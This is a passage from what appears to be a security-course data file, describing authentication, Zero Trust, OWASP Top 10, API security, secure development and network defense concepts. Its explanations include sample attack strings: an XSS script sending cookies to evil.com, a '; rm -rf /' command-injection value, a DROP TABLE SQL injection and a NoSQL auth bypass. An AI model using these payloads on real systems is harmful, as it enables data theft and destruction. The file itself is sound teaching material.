          'JWT claims should include iss (issuer), sub (subject), aud (audience), exp (expiration), iat (issued at), and jti (JWT ID for tracking) — missing audience validation allows token confusion attacks where a token for one service is used on another',
          'The "alg: none" vulnerability occurs when JWT libraries accept unsigned tokens — an attacker modifies the header to {"alg": "none"}, removes the signature, and the server accepts the modified token as valid, bypassing all authorization',
        ],
        tradeoffs: [
          'JWTs enable stateless authorization without database lookups but cannot be easily revoked before expiration — to "revoke" a JWT, you need a deny-list (which reintroduces server-side state) or very short expiration times with frequent refresh token rotation',
          'Session tokens are simpler and offer immediate revocation but require centralized session storage — in distributed systems, this means a shared session store (Redis cluster) that adds latency and operational complexity',
        ],
        realWorld: [
          'Auth0 and Firebase Authentication issue JWTs as access and ID tokens for client-side verification',
          'Kubernetes API server uses JWT (ServiceAccount tokens) for pod-to-API-server authentication',
          'Ruby on Rails and Django use server-side session cookies stored in Redis or the database by default',
        ],
      },
      {
        id: 'token-lifecycle-revocation',
        name: 'Token Lifecycle & Revocation',
        description:
          'Managing the complete lifecycle of authentication tokens — issuance, validation, refresh, rotation, and revocation — is critical for security. Improper lifecycle management leads to token theft, replay attacks, and persistent unauthorized access.',
        keyPoints: [
          'Token issuance should bind tokens to the client context — including the client IP, user agent, or device fingerprint as claims, and validating these on each request to detect stolen tokens being used from a different context',
          'Short-lived access tokens (5-15 minutes) with long-lived refresh tokens (days to weeks) balance security and usability — if an access token is stolen, it expires quickly, and refresh tokens can be stored more securely (HttpOnly cookies, server-side)',
          'Refresh token rotation issues a new refresh token with each use and invalidates the previous one — if an attacker steals and uses a refresh token, the legitimate user\'s next refresh attempt will fail (using the now-invalidated token), alerting the system to compromise',
          'Token revocation for JWTs requires a server-side deny-list (checked on each request) or short expiration with no refresh — OAuth 2.0 Token Revocation (RFC 7009) provides a standard endpoint for revoking tokens at the authorization server',
          'Logout must invalidate all active tokens — clearing the client-side token is insufficient because a copied token remains valid, requiring server-side session destruction or token deny-listing to prevent continued use',
        ],
        tradeoffs: [
          'Very short token lifetimes (1-5 minutes) minimize exposure but increase the frequency of refresh token exchanges, adding latency and server load — most systems settle on 15-60 minute access tokens as a practical compromise',
          'Token deny-lists for JWT revocation undermine the stateless benefit of JWTs — if you must check a deny-list on every request, you might as well use session tokens, which offer the same benefit with simpler implementation',
        ],
        realWorld: [
          'Slack rotates refresh tokens on each use and invalidates all tokens for a workspace when a security incident is detected',
          'GitHub Personal Access Tokens have configurable expiration and fine-grained repository scopes',
          'Google OAuth issues refresh tokens that expire after 6 months of inactivity and are revoked if the user changes their password',
        ],
      },
    ],
  },
  {
    id: 7,
    title: 'Identity & Zero Trust',
    part: 2,
    partTitle: 'Authentication & Authorization',
    summary:
      'Modern identity architectures move beyond perimeter-based security to Zero Trust models where every request is authenticated and authorized regardless of network location. Single Sign-On and federation enable seamless yet secure access across organizational boundaries.',
    concepts: [
      {
        id: 'sso-federation',
        name: 'SSO & Federation',
        description:
          'Single Sign-On (SSO) allows users to authenticate once and access multiple applications without re-entering credentials. Federation extends this across organizational boundaries, enabling identity providers to authenticate users for external service providers.',
        keyPoints: [
          'SSO reduces password fatigue and phishing risk — users authenticate once with a strong credential (password + MFA) at the identity provider, and subsequent applications receive a signed assertion or token proving the user\'s identity',
          'Federation protocols (SAML, OIDC, WS-Federation) define how identity assertions are securely exchanged between IdP and SP — the IdP asserts the user\'s identity and attributes, the SP trusts the IdP\'s assertion based on pre-configured trust relationships',
          'SCIM (System for Cross-domain Identity Management) automates user provisioning and deprovisioning across federated systems — when an employee is terminated in the IdP, SCIM automatically disables their accounts across all connected SPs',
          'IdP-initiated vs SP-initiated SSO: in SP-initiated, the user tries to access the SP first and is redirected to the IdP for authentication; in IdP-initiated, the user starts at the IdP portal and clicks to access the SP — IdP-initiated SAML has a known vulnerability to CSRF if not properly protected',
          'Just-In-Time (JIT) provisioning creates user accounts in the SP automatically when the user first authenticates via SSO — eliminating the need for pre-provisioning but requiring the IdP to send all necessary user attributes in the assertion',
        ],
        tradeoffs: [
          'SSO creates a single point of failure — if the IdP is compromised or unavailable, all connected applications are affected, making IdP security and availability critical (HA deployment, incident response)',
          'Federation enables seamless cross-organization access but requires trust relationships — trusting an external IdP means accepting their authentication strength, and a weak IdP compromises all relying SPs',
        ],
        realWorld: [
          'Okta and Azure AD provide SSO for thousands of enterprise applications via SAML and OIDC federation',
          'GitHub Enterprise uses SAML SSO with IdPs like Okta, Azure AD, and OneLogin for organization-wide authentication',
          'Google Workspace acts as both an IdP (providing SSO to third-party apps) and an SP (accepting authentication from enterprise IdPs)',
        ],
      },
      {
        id: 'zero-trust-architecture',
        name: 'Zero Trust Architecture',
        description:
          'Zero Trust eliminates implicit trust based on network location — every request is authenticated, authorized, and encrypted regardless of whether it originates inside or outside the corporate network. The principle is "never trust, always verify."',
        keyPoints: [
          'Traditional perimeter security (castle-and-moat) assumes everything inside the network is trusted — Zero Trust assumes breach and verifies every request, treating the internal network as equally hostile as the internet',
          'Zero Trust pillars: verify identity (strong authentication), validate device health (compliance, patch level, EDR status), enforce least-privilege access (just enough permissions, just in time), and assume breach (log everything, automate response)',
          'BeyondCorp (Google\'s Zero Trust implementation) moved all applications behind an identity-aware proxy — access is granted based on user identity, device state, and context, not network location, eliminating the need for VPN',
          'Micro-segmentation divides the network into small zones with independent access controls — even if an attacker compromises one segment, lateral movement to other segments requires separate authentication and authorization',
          'Continuous verification re-evaluates trust throughout a session — instead of authenticate-once at session start, the system continuously checks device health, user behavior, and risk signals, potentially stepping up authentication or terminating sessions in real-time',
        ],
        tradeoffs: [
          'Zero Trust significantly improves security posture against lateral movement and insider threats, but requires substantial infrastructure investment — identity-aware proxies, device management, policy engines, and comprehensive logging',
          'Continuous verification adds latency to every request and requires a robust policy engine — in latency-sensitive applications, the overhead of per-request authorization checks must be minimized through caching and efficient policy evaluation',
        ],
        realWorld: [
          'Google BeyondCorp enables 100,000+ employees to work securely without VPN from any location',
          'Cloudflare Access provides Zero Trust access to internal applications using identity-aware reverse proxy',
          'NIST SP 800-207 defines the Zero Trust Architecture framework adopted by US federal agencies',
        ],
      },
      {
        id: 'privileged-access-management',
        name: 'Privileged Access Management',
        description:
          'Privileged Access Management (PAM) controls and monitors access to critical systems by privileged users (administrators, DevOps, database admins). It enforces just-in-time access, session recording, and credential vaulting to reduce the risk of insider threats and credential theft.',
        keyPoints: [
          'Credential vaulting stores privileged credentials (root passwords, API keys, database passwords) in a secure vault — applications and users check out credentials for temporary use, and the vault automatically rotates them after use or on a schedule',
          'Just-in-Time (JIT) access grants elevated privileges only when needed and for a limited duration — an engineer requests admin access, it is approved (manually or automatically based on policy), granted for 2 hours, and automatically revoked afterward',
          'Session recording captures all privileged session activity (terminal commands, GUI interactions) for forensic audit — enabling investigation of what a privileged user did during their access window without relying on self-reporting',
          'Break-glass procedures provide emergency access to critical systems when normal authentication is unavailable — typically requiring multiple approvers, generating alerts, and creating an audit trail for post-incident review',
          'Service account management is critical — shared credentials for automated processes must be rotated regularly, scoped to minimum permissions, and monitored for anomalous usage (e.g., a CI/CD service account used from an unexpected IP)',
        ],
        tradeoffs: [
          'PAM reduces risk from privileged credential theft and insider threats but adds friction to administrative workflows — engineers must request access, wait for approval, and work within time-limited sessions, which can slow incident response',
          'Full session recording provides comprehensive audit trails but generates large volumes of data — storing and indexing all privileged session recordings requires significant storage infrastructure and review processes',
        ],
        realWorld: [
          'CyberArk and HashiCorp Vault provide credential vaulting with automatic rotation for database passwords, SSH keys, and cloud credentials',
          'AWS IAM Identity Center provides JIT access to AWS accounts with time-limited role sessions',
          'Teleport provides session recording and audit logging for SSH, Kubernetes, and database access',
        ],
      },
    ],
  },

  // ============================================================
  // PART 3: Application Security (Topics 8-10)
  // ============================================================
  {
    id: 8,
    title: 'OWASP Top 10',
    part: 3,
    partTitle: 'Application Security',
    summary:
      'The OWASP Top 10 is the most widely referenced standard for web application security risks. Understanding these vulnerabilities, their exploitation techniques, and defenses is foundational to building secure applications.',
    concepts: [
      {
        id: 'injection-attacks',
        name: 'Injection Attacks',
        description:
          'Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query — the attacker\'s hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data.',
        keyPoints: [
          'SQL injection inserts malicious SQL into query parameters — e.g., input of "1; DROP TABLE users--" in a query concatenated as "SELECT * FROM users WHERE id = " + input causes the database to execute the DROP command',
          'Parameterized queries (prepared statements) are the primary defense — the SQL structure is pre-compiled and user input is bound as data, never interpreted as SQL syntax, making injection impossible regardless of input content',
          'NoSQL injection targets document databases (MongoDB) — input like {"$gt": ""} in a JSON query can bypass authentication by matching all documents, and MongoDB operators in user input can modify query logic',
          'Command injection occurs when user input is passed to OS command execution — e.g., using system("ping " + userInput) where input of "; rm -rf /" chains a destructive command, mitigated by using language-native APIs instead of shell commands',
          'LDAP injection, XPath injection, and template injection follow the same pattern — any interpreter that processes mixed code and data is vulnerable if inputs are not properly separated from the query/command structure',
        ],
        tradeoffs: [
          'Parameterized queries are the gold standard but don\'t work for dynamic table/column names — these must be validated against an allowlist of known-good values, not parameterized (most databases don\'t support parameterized identifiers)',
          'ORM frameworks (SQLAlchemy, Prisma) generally prevent SQL injection by default but can still be vulnerable when using raw query methods — developers must understand that ORM usage doesn\'t eliminate all injection risk',
        ],
        realWorld: [
          'The 2017 Equifax breach (143 million records) exploited an Apache Struts vulnerability allowing command injection',
          'Bobby Tables (xkcd #327) popularized SQL injection awareness — the comic shows a student named "Robert\'); DROP TABLE Students;--"',
          'Prepared statements are supported by all major databases: PostgreSQL ($1), MySQL (?), Oracle (:param), SQL Server (@param)',
        ],
      },
      {
        id: 'xss-csrf',
        name: 'XSS & CSRF',
        description:
          'Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other users, while Cross-Site Request Forgery (CSRF) tricks a user\'s browser into making unauthorized requests to a site where they are authenticated.',
        keyPoints: [
          'Stored XSS persists malicious script in the database (e.g., a forum post containing <script>document.location="evil.com?c="+document.cookie</script>) — every user viewing the post executes the script, sending their session cookies to the attacker',
          'Reflected XSS embeds script in a URL parameter that is echoed back in the page — the attacker crafts a malicious URL and tricks the victim into clicking it, executing the script in the victim\'s browser session',
          'Content Security Policy (CSP) headers restrict which scripts can execute — "script-src \'self\'" prevents inline scripts and scripts from external domains, dramatically reducing XSS impact even if injection occurs',
          'CSRF exploits the browser\'s automatic cookie inclusion — if a user is logged into bank.com, a malicious page can submit a form to bank.com/transfer?to=attacker&amount=10000 and the browser automatically includes the user\'s session cookie',
          'CSRF defenses include synchronizer tokens (unique per-session random token embedded in forms and validated server-side), SameSite cookie attribute (Lax or Strict prevents cookies from being sent on cross-site requests), and checking Origin/Referer headers',
        ],
        tradeoffs: [
          'Strict CSP policies effectively mitigate XSS but can break legitimate functionality — inline event handlers, eval(), and third-party scripts (analytics, ads) require CSP exceptions that weaken protection, requiring careful policy tuning',
          'SameSite=Strict cookies provide the strongest CSRF protection but break legitimate cross-site navigation (clicking a link to your site from an email won\'t send cookies) — SameSite=Lax is the practical default, allowing top-level navigations but blocking embedded requests',
        ],
        realWorld: [
          'The Samy worm (2005) used stored XSS on MySpace to add "Samy is my hero" to over 1 million profiles in 20 hours',
          'GitHub uses strict CSP headers and nonce-based script loading to prevent XSS across their platform',
          'Chrome, Firefox, and Safari default to SameSite=Lax for cookies without an explicit SameSite attribute',
        ],
      },
      {
        id: 'broken-auth-security-misconfig',
        name: 'Broken Auth & Security Misconfiguration',
        description:
          'Broken authentication vulnerabilities allow attackers to bypass or exploit authentication mechanisms, while security misconfigurations expose unnecessary features, default credentials, or overly permissive settings that attackers can leverage.',
        keyPoints: [
          'Credential stuffing uses leaked username/password pairs from breaches to attempt login on other sites — since users reuse passwords, a breach at one site compromises accounts across many services, mitigated by MFA and breach password checking (HaveIBeenPwned API)',
          'Session fixation forces a known session ID onto a victim — the attacker sets the session cookie before the victim logs in, then uses the same session ID after authentication, mitigated by regenerating the session ID on login',
          'Default credentials on databases, admin panels, and infrastructure (admin/admin, root/root) are the simplest misconfiguration to exploit — automated scanners check for default credentials on exposed services within minutes of deployment',
          'Verbose error messages leak implementation details (stack traces, SQL errors, version numbers) that help attackers craft targeted exploits — production applications should return generic error messages and log detailed errors server-side only',
          'Unnecessary open ports, enabled debug endpoints, and directory listing expose attack surface — security hardening includes disabling unused features, removing default pages, and running security baseline checks (CIS Benchmarks) before deployment',
        ],
        tradeoffs: [
          'Account lockout after failed login attempts prevents brute force but enables denial of service — an attacker can lock out legitimate users by deliberately failing authentication, which is why progressive delays (exponential backoff) and CAPTCHA are preferred over hard lockouts',
          'Security hardening reduces attack surface but increases deployment complexity — automated configuration management (Ansible, Terraform) and security scanning in CI/CD pipelines help maintain hardened configurations at scale without manual overhead',
        ],
        realWorld: [
          'The 2020 SolarWinds attack partly exploited misconfigured Azure AD permissions and weak monitoring',
          'MongoDB instances without authentication exposed ~600 million records in 2017 due to default bind-all configuration',
          'NIST SP 800-123 provides security configuration guidelines for servers, and CIS Benchmarks offer specific hardening checklists for every major platform',
        ],
      },
    ],
  },
  {
    id: 9,
    title: 'API Security',
    part: 3,
    partTitle: 'Application Security',
    summary:
      'APIs are the primary attack surface of modern applications. Securing APIs requires defense-in-depth: rate limiting to prevent abuse, strict input validation to prevent injection, CORS to control browser access, and robust authentication patterns to verify every request.',
    concepts: [
      {
        id: 'rate-limiting-throttling',
        name: 'Rate Limiting & Throttling',
        description:
          'Rate limiting restricts the number of requests a client can make within a time window, protecting APIs from abuse, brute force attacks, denial of service, and resource exhaustion by both malicious actors and misconfigured clients.',
        keyPoints: [
          'Token bucket algorithm allows a burst of requests up to the bucket capacity, then limits to a steady rate — the bucket fills with tokens at a fixed rate (e.g., 10/second), each request consumes a token, and requests are rejected when the bucket is empty',
          'Sliding window counters track request counts in a moving time window — more accurate than fixed windows (which allow bursts at window boundaries) but require more storage to track per-client timestamps',
          'Rate limits should vary by endpoint sensitivity — login endpoints need strict limits (5-10 attempts per minute per IP/account) while read-heavy API endpoints can be more permissive (1000 requests per minute)',
          'Rate limit headers (X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset) inform well-behaved clients of their quota — enabling clients to self-throttle and avoid hitting limits, improving API usability',
          'Distributed rate limiting across multiple API servers requires a shared counter store (Redis) — each server increments a shared counter atomically, ensuring consistent limits regardless of which server handles the request',
        ],
        tradeoffs: [
          'Strict rate limits prevent abuse but can impact legitimate users during traffic spikes — adaptive rate limiting that adjusts thresholds based on system load and user behavior provides better balance than static limits',
          'Per-IP rate limiting is simple but fails against distributed attacks (botnets) and unfairly limits users behind NAT/proxies sharing an IP — per-user or per-API-key limiting is more accurate but requires authentication before rate limiting',
        ],
        realWorld: [
          'GitHub API enforces 5,000 requests/hour for authenticated users and 60/hour for unauthenticated, returning 429 status with Retry-After header',
          'Stripe rate limits at 100 requests/second per API key with automatic retry handling in their client libraries',
          'Cloudflare Rate Limiting protects APIs at the edge with configurable rules based on URL patterns, headers, and client attributes',
        ],
      },
      {
        id: 'input-validation-cors',
        name: 'Input Validation & CORS',
        description:
          'Input validation ensures that all data entering the system conforms to expected formats and constraints, while CORS (Cross-Origin Resource Sharing) controls which domains can make browser-based requests to your API, preventing unauthorized cross-origin access.',
        keyPoints: [
          'Server-side validation is mandatory — client-side validation improves UX but can be bypassed trivially (browser DevTools, curl), so the server must independently validate all inputs regardless of client-side checks',
          'Allowlist validation (accepting only known-good input patterns) is safer than denylist validation (rejecting known-bad patterns) — denylists are always incomplete because attackers find new encoding tricks and bypass patterns',
          'CORS preflight (OPTIONS request) checks whether the server allows the actual request — the browser sends an OPTIONS request with Origin, Access-Control-Request-Method, and Access-Control-Request-Headers, and only proceeds if the server\'s response allows it',
          'Access-Control-Allow-Origin should never be set to "*" (wildcard) for APIs with authentication — the wildcard allows any website to make authenticated requests, and combined with Access-Control-Allow-Credentials: true, this enables any site to steal user data',
          'Input length limits, type checking, and schema validation (JSON Schema, Zod, Joi) provide structured validation — rejecting inputs that exceed expected lengths prevents buffer overflow attacks and resource exhaustion from processing oversized payloads',
        ],
        tradeoffs: [
          'Strict input validation prevents many attack categories but can reject legitimate inputs if too aggressive — international names with Unicode characters, addresses with special characters, and valid edge cases must be handled without breaking functionality',
          'CORS provides browser-level protection but does not protect against server-to-server requests — tools like curl, Postman, and backend services bypass CORS entirely, so CORS is a defense-in-depth measure, not a primary access control mechanism',
        ],
        realWorld: [
          'AWS API Gateway supports request validation with JSON Schema and transforms, rejecting malformed requests before reaching backend Lambda functions',
          'Express.js middleware like helmet sets secure CORS headers by default, and express-validator provides declarative input validation',
          'GraphQL APIs are particularly vulnerable to unbounded query depth and complexity — validation middleware limits query depth, breadth, and cost to prevent resource exhaustion',
        ],
      },
      {
        id: 'api-authentication-patterns',
        name: 'API Authentication Patterns',
        description:
          'API authentication verifies the identity of clients making API requests through various mechanisms — API keys for simple identification, OAuth tokens for delegated access, and mutual TLS for strong machine-to-machine authentication.',
        keyPoints: [
          'API keys are simple shared secrets sent in headers (X-API-Key) or query parameters — they identify the calling application but don\'t authenticate individual users, and if leaked, provide full access until rotated',
          'Bearer tokens (OAuth 2.0 access tokens) are sent in the Authorization header — the server validates the token (signature verification for JWTs, or introspection endpoint for opaque tokens) to determine identity and permissions',
          'Mutual TLS (mTLS) requires both client and server to present X.509 certificates — providing strong machine-to-machine authentication without shared secrets, commonly used in service meshes (Istio) for zero-trust inter-service communication',
          'API request signing (AWS SigV4) creates a signature over the request method, URL, headers, and body using HMAC-SHA256 — this authenticates the sender and ensures request integrity (any modification invalidates the signature), without transmitting the secret key',
          'API gateway authentication offloads token validation from individual services — the gateway validates authentication centrally, forwards verified identity claims (user ID, scopes) to backend services in trusted headers, and rejects unauthenticated requests',
        ],
        tradeoffs: [
          'API keys are simple to implement but provide weak security (no user-level auth, no expiration by default, easily leaked in logs/URLs) — OAuth tokens are more secure but add complexity with token refresh, scope management, and authorization server infrastructure',
          'mTLS provides the strongest machine authentication but requires certificate management infrastructure (issuance, rotation, revocation for every client) — in dynamic environments like Kubernetes, service meshes automate this but add operational complexity',
        ],
        realWorld: [
          'AWS uses SigV4 request signing for all API calls, with temporary credentials from STS for additional security',
          'Istio service mesh automatically provisions and rotates mTLS certificates between pods using SPIFFE identities',
          'Twilio uses API keys with account SID for identification and auth token for request signing in their REST API',
        ],
      },
    ],
  },
  {
    id: 10,
    title: 'Secure Development',
    part: 3,
    partTitle: 'Application Security',
    summary:
      'Secure development integrates security throughout the software development lifecycle — from threat modeling during design, to automated security scanning during development, to dependency analysis to prevent supply chain attacks.',
    concepts: [
      {
        id: 'threat-modeling-stride',
        name: 'Threat Modeling (STRIDE)',
        description:
          'Threat modeling is a structured approach to identifying security threats during the design phase, before code is written. STRIDE categorizes threats into six types, providing a systematic framework for analyzing attack surfaces.',
        keyPoints: [
          'STRIDE categories: Spoofing (impersonating another identity), Tampering (modifying data or code), Repudiation (denying actions without accountability), Information Disclosure (unauthorized data exposure), Denial of Service (making systems unavailable), Elevation of Privilege (gaining unauthorized access levels)',
          'Threat modeling creates data flow diagrams (DFDs) showing how data moves through the system — trust boundaries (where data crosses from trusted to untrusted zones) are the primary points where security controls must be applied',
          'Each STRIDE category maps to a security property: Spoofing violates Authentication, Tampering violates Integrity, Repudiation violates Non-repudiation, Information Disclosure violates Confidentiality, DoS violates Availability, EoP violates Authorization',
          'Threat modeling should happen during design, not after deployment — identifying a missing authentication check in the design phase costs minutes to fix, while discovering it in production requires emergency patching and incident response',
          'DREAD (Damage, Reproducibility, Exploitability, Affected users, Discoverability) provides a risk rating framework for prioritizing identified threats — high-DREAD threats should be addressed before launch',
        ],
        tradeoffs: [
          'Comprehensive threat modeling improves security posture but requires significant time investment — a full STRIDE analysis of a complex system can take days, and must be updated as the architecture evolves',
          'Automated threat modeling tools (Microsoft Threat Modeling Tool, OWASP Threat Dragon) speed up the process but may miss novel threats specific to your architecture — they complement but don\'t replace human analysis',
        ],
        realWorld: [
          'Microsoft requires threat modeling for all new features as part of their Security Development Lifecycle (SDL)',
          'OWASP Threat Dragon provides an open-source threat modeling tool with STRIDE support and DFD generation',
          'AWS Well-Architected Framework includes threat modeling as part of the Security Pillar review process',
        ],
      },
      {
        id: 'sast-dast-scanning',
        name: 'SAST & DAST Scanning',
        description:
          'Static Application Security Testing (SAST) analyzes source code for vulnerabilities without running the application, while Dynamic Application Security Testing (DAST) tests the running application from the outside, simulating real attacks.',
        keyPoints: [
          'SAST (white-box testing) scans source code, bytecode, or binaries for vulnerability patterns — detecting issues like SQL injection (string concatenation in queries), hardcoded secrets, insecure deserialization, and buffer overflows before the code is deployed',
          'DAST (black-box testing) sends malicious requests to a running application — testing for XSS by injecting script tags, SQL injection by sending single quotes, and authentication bypass by manipulating tokens, finding runtime vulnerabilities that SAST cannot detect',
          'SAST runs early in CI/CD (on every commit/PR) providing immediate developer feedback — DAST runs later against staging environments, testing the full application stack including configuration, middleware, and deployment settings',
          'False positives are a major challenge for both SAST and DAST — SAST may flag sanitized input as vulnerable (the tool can\'t trace data flow through complex validation logic), while DAST may miss vulnerabilities behind authentication or in rarely-exercised code paths',
          'IAST (Interactive AST) instruments the application at runtime to observe actual data flows — combining SAST\'s code awareness with DAST\'s runtime context to reduce false positives and detect vulnerabilities like taint propagation through the actual execution path',
        ],
        tradeoffs: [
          'SAST provides early detection and covers all code paths but produces false positives and cannot detect runtime/configuration issues — DAST finds real exploitable vulnerabilities in context but only tests reachable code paths and runs slower',
          'Running SAST on every PR provides fast feedback but can block development with false positives — tuning rules, suppressing verified false positives, and running intensive scans nightly rather than on every commit balances security with developer velocity',
        ],
        realWorld: [
          'GitHub Advanced Security includes CodeQL (SAST) that runs automatically on pull requests and alerts on vulnerable patterns',
          'OWASP ZAP provides free, open-source DAST scanning that can be integrated into CI/CD pipelines',
          'Snyk Code provides real-time SAST analysis directly in the IDE, giving developers immediate feedback while coding',
        ],
      },
      {
        id: 'dependency-security-sca',
        name: 'Dependency Security & SCA',
        description:
          'Software Composition Analysis (SCA) identifies known vulnerabilities in third-party libraries and dependencies. With modern applications using hundreds of open-source packages, supply chain security is critical — a single vulnerable dependency can compromise the entire application.',
        keyPoints: [
          'The average application has 70-80% third-party code — a vulnerability in any dependency (direct or transitive) exposes the application, and developers often don\'t know which transitive dependencies are pulled in by their direct dependencies',
          'CVE (Common Vulnerabilities and Exposures) databases and NVD (National Vulnerability Database) track known vulnerabilities — SCA tools match your dependency versions against these databases and alert when vulnerable versions are detected',
          'Lock files (package-lock.json, yarn.lock, Pipfile.lock) pin exact dependency versions — ensuring reproducible builds and preventing automatic updates to compromised versions, but requiring active monitoring and updates when vulnerabilities are discovered',
          'Supply chain attacks inject malicious code into legitimate packages — typosquatting (lodas instead of lodash), maintainer account compromise (event-stream incident), and malicious updates to popular packages can affect millions of downstream applications',
          'Automated dependency updates (Dependabot, Renovate) create pull requests when new versions are available — including vulnerability fixes, changelogs, and compatibility information, reducing the manual burden of keeping dependencies current',
        ],
        tradeoffs: [
          'Aggressive dependency updating provides the latest security patches but risks introducing breaking changes — organizations must balance staying current (security) against stability (testing), typically using automated testing to validate dependency updates',
          'Vendoring dependencies (copying them into your repository) provides complete control and protection against upstream tampering but increases repository size and makes updates a manual process — most modern ecosystems prefer lock files over vendoring',
        ],
        realWorld: [
          'The Log4Shell vulnerability (CVE-2021-44228) in Log4j affected millions of Java applications, demonstrating the blast radius of a single dependency vulnerability',
          'GitHub Dependabot automatically creates PRs for vulnerable dependencies with severity-ranked alerts',
          'npm audit and Snyk scan the dependency tree for known vulnerabilities, with Snyk providing fix suggestions and compatibility analysis',
        ],
      },
    ],
  },

  // ============================================================
  // PART 4: Infrastructure Security (Topics 11-13)
  // ============================================================
  {
    id: 11,
    title: 'Network Security',
    part: 4,
    partTitle: 'Infrastructure Security',
    summary:
      'Network security protects data in transit and the infrastructure itself through firewalls, intrusion detection systems, VPNs, and DDoS mitigation. Defense-in-depth at the network layer is the first line of protection against external attacks.',
    concepts: [
      {
        id: 'firewalls-ids-ips',
        name: 'Firewalls & IDS/IPS',
        description:
          'Firewalls control network traffic flow based on rules, while Intrusion Detection Systems (IDS) monitor for suspicious activity and Intrusion Prevention Systems (IPS) actively block detected threats. Together they provide layered network defense.',
        keyPoints: [
          'Stateful firewalls track connection state (TCP handshake, established sessions) — they allow return traffic for established connections without explicit rules, providing more intelligent filtering than stateless packet-filtering firewalls that evaluate each packet independently',
          'Next-Generation Firewalls (NGFW) inspect traffic at the application layer (Layer 7) — they can identify and control applications regardless of port (blocking BitTorrent on port 443), perform SSL/TLS inspection, and integrate threat intelligence feeds',
          'IDS passively monitors traffic and generates alerts for suspicious patterns — using signature-based detection (matching known attack patterns) and anomaly-based detection (flagging traffic that deviates from learned baselines)',
          'IPS sits inline in the traffic path and actively blocks malicious traffic in real-time — unlike IDS which only alerts, IPS drops malicious packets, resets connections, or quarantines traffic based on detected threats',
          'Security groups (AWS) and NSGs (Azure) act as virtual firewalls for cloud resources — they are stateful, operate at the instance/NIC level, and follow deny-all-by-default rules, requiring explicit allow rules for each traffic flow',
        ],
        tradeoffs: [
          'IPS provides active threat blocking but can cause false positive blocks that disrupt legitimate traffic — a misconfigured IPS rule can bring down production services, requiring careful tuning and a fail-open vs fail-close decision',
          'Deep packet inspection (DPI) enables application-aware security but requires SSL/TLS termination (breaking end-to-end encryption) to inspect encrypted traffic — this creates a privacy concern and a potential security weakness at the inspection point',
        ],
        realWorld: [
          'AWS Security Groups and Network ACLs provide instance-level and subnet-level firewalling respectively in VPC',
          'Palo Alto Networks and Fortinet provide NGFW solutions with application-layer inspection and threat prevention',
          'Suricata and Snort are open-source IDS/IPS engines used for network threat detection in both enterprise and cloud environments',
        ],
      },
      {
        id: 'vpn-network-segmentation',
        name: 'VPN & Network Segmentation',
        description:
          'Virtual Private Networks (VPNs) create encrypted tunnels for secure remote access, while network segmentation divides networks into isolated zones to limit the blast radius of breaches and enforce the principle of least privilege at the network level.',
        keyPoints: [
          'Site-to-site VPN connects entire networks (office to cloud VPC) over encrypted tunnels using IPsec — both endpoints negotiate security associations (encryption algorithm, keys, lifetime) and encapsulate all inter-network traffic in encrypted packets',
          'Remote access VPN (OpenVPN, WireGuard) allows individual users to securely access corporate networks from any location — WireGuard uses modern cryptography (Curve25519, ChaCha20) with a minimal codebase (~4000 lines vs OpenVPN\'s ~100,000) reducing attack surface',
          'Network segmentation places different system tiers in separate network zones — web servers in a DMZ, application servers in a private subnet, databases in an isolated data zone, with firewalls controlling traffic between zones',
          'VLANs (Virtual LANs) provide Layer 2 segmentation on a shared physical network — traffic between VLANs must pass through a router or firewall with access control rules, preventing lateral movement within the flat network',
          'Software-Defined Networking (SDN) enables dynamic, programmable network segmentation — microsegmentation policies can be defined per workload and automatically enforced, even as containers and VMs move across hosts',
        ],
        tradeoffs: [
          'VPN provides secure remote access but concentrates all traffic through a central point — this creates bandwidth bottlenecks and means VPN server compromise grants access to the entire network, which is why Zero Trust alternatives are gaining adoption',
          'Fine-grained microsegmentation provides optimal blast radius containment but increases management complexity — managing thousands of per-workload network policies requires automation and can cause connectivity issues if policies are misconfigured',
        ],
        realWorld: [
          'AWS VPC with public/private subnets, NAT gateways, and security groups implements network segmentation in the cloud',
          'WireGuard is integrated into the Linux kernel since version 5.6 and used by Cloudflare WARP, Tailscale, and Mullvad VPN',
          'PCI DSS requires network segmentation to isolate cardholder data environments from the general corporate network',
        ],
      },
      {
        id: 'ddos-mitigation',
        name: 'DDoS Mitigation',
        description:
          'Distributed Denial of Service (DDoS) attacks overwhelm systems with traffic from many sources to make services unavailable. Mitigation combines network-layer filtering, traffic scrubbing, CDN absorption, and architectural resilience to maintain availability under attack.',
        keyPoints: [
          'Volumetric DDoS attacks (UDP flood, DNS amplification, NTP reflection) overwhelm network bandwidth — amplification attacks exploit protocols that respond with much larger responses than the request, with amplification factors up to 50,000x (memcached reflection)',
          'Application-layer DDoS (HTTP flood, Slowloris) target specific endpoints with seemingly legitimate requests — these are harder to detect than volumetric attacks because each request looks normal, but thousands of concurrent requests exhaust server resources',
          'Anycast routing distributes incoming traffic across multiple data centers globally — DDoS traffic is absorbed by the nearest point of presence rather than concentrated on a single server, effectively multiplying available capacity',
          'Traffic scrubbing centers analyze incoming traffic in real-time, separating legitimate requests from attack traffic — using behavioral analysis, challenge-response (CAPTCHA, JavaScript challenges), and rate limiting to pass clean traffic while dropping malicious requests',
          'Auto-scaling infrastructure absorbs some DDoS impact but has cost implications — an attacker can trigger expensive scaling events (Economic Denial of Service), so scaling policies should include cost limits and anomaly detection',
        ],
        tradeoffs: [
          'Cloud DDoS protection services (Cloudflare, AWS Shield) can absorb massive attacks but add latency (traffic routes through scrubbing centers) and cost — AWS Shield Advanced costs $3,000/month but provides DDoS cost protection and 24/7 response team',
          'Aggressive DDoS filtering can block legitimate traffic during attacks (false positives) — geographic blocking, rate limiting, and challenge pages impact real users, requiring careful calibration between protection and user experience',
        ],
        realWorld: [
          'Cloudflare mitigated a 26 million requests-per-second HTTPS DDoS attack in 2022 using their anycast network',
          'AWS Shield Standard provides automatic protection against common volumetric DDoS attacks for all AWS customers at no extra cost',
          'Akamai Prolexic provides dedicated DDoS scrubbing with 20+ Tbps of global scrubbing capacity',
        ],
      },
    ],
  },
  {
    id: 12,
    title: 'Cloud Security',
    part: 4,
    partTitle: 'Infrastructure Security',
    summary:
      'Cloud security addresses the unique challenges of securing infrastructure, applications, and data in cloud environments. The shared responsibility model divides security duties between the cloud provider and the customer, requiring robust IAM, encryption, and compliance controls.',
    concepts: [
      {
        id: 'iam-security-policies',
        name: 'IAM & Security Policies',
        description:
